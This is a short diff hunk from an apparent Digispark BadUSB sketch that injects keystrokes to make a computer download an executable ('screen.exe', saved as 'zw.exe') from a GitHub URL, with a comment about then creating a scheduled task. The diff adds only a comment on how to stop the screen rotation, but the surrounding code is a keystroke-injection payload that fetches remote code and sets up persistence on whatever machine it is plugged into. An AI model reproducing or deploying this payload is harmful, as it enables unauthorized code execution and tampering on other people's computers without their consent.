@@ -19,6 +19,7 @@ void loop() {
   DigiKeyboard.delay(500);
   //download screen rotate exe from the github
   DigiKeyboard.print("$client.DownloadFile(\"https://github.com/SharafMawjood/Screen-Rotator-Loop-Python-Script/raw/main/screen.exe\" , \"zw.exe\")");
+  //for stop rotate screen press "Right CTRL + WIN + DEL"
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
   //create task shedule 10:12, 13:12
